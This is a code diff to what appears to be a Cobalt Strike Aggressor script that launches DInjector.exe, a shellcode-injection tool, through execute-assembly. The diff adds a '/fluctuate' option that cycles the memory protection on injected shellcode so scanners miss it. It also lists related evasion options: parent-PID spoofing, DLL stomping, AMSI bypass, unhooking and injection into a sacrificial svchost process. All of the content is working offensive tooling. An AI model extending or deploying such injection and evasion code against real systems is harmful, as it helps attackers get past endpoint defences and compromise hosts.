@@ -58,6 +58,7 @@ sub dinject {
     $cmd .= " /protect:"     . %options["protect"];
     $cmd .= " /timeout:"     . %options["timeout"];
     $cmd .= " /flipSleep:"   . %options["flipSleep"];
+    $cmd .= " /fluctuate:"   . %options["fluctuate"];
     $cmd .= " /image:"       . %options["image"];
     $cmd .= " /pid:"         . %options["pid"];
     $cmd .= " /ppid:"        . %options["ppid"];
@@ -81,8 +82,8 @@ sub dinject {
 
     blog($bid, "\c7Executed command\cF:\cD execute-assembly DInjector.exe "
          . %options["technique"] . " /sc:<BASE64>" . " /p:$pass" . " /protect:" . %options["protect"]
-         . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /image:" . %options["image"]
-         . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
+         . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /fluctuate:" . %options["fluctuate"]
+         . " /image:" . %options["image"] . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
          . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
          . " /blockDlls:" . %options["blockDlls"] . " /am51:" . %options["am51"] . "/remoteAm51:" . %options["remoteAm51"]
          . " /unhook:" . %options["unhook"]);
@@ -119,6 +120,7 @@ popup beacon_bottom {
         %options["protect"]     = "RX";
         %options["timeout"]     = "0";
         %options["flipSleep"]   = "0";
+        %options["fluctuate"]   = "0";
         %options["image"]       = "C:\\Windows\\System32\\svchost.exe";
         %options["pid"]         = "0";
         %options["ppid"]        = "0";
@@ -160,7 +162,8 @@ popup beacon_bottom {
 
         drow_text($dialog, "protect",     "[/protect] Memory protection for the shellcode (RX / RWX):");
         drow_text($dialog, "timeout",     "[/timeout] Timeout for WaitForSingleObject in ms (0 is serve forever):");
-        drow_text($dialog, "flipSleep",   "[/flipSleep] Time to sleep with PAGE_NOACCESS on shellcode in ms (0 disabled):");
+        drow_text($dialog, "flipSleep",   "[/flipSleep] Time to sleep with PAGE_NOACCESS on shellcode in ms (0 is disabled):");
+        drow_text($dialog, "fluctuate",   "[/fluctuate] Memory protection for the shellcode to fluctuate with (0 is disabled):");
         drow_text($dialog, "image",       "[/image] Path to the image of a newly spawned sacrifical process to inject into:");
         drow_text($dialog, "pid",         "[/pid] Existing process ID to inject into:");
         drow_text($dialog, "ppid",        "[/ppid] Parent process ID to spoof the original value with:");
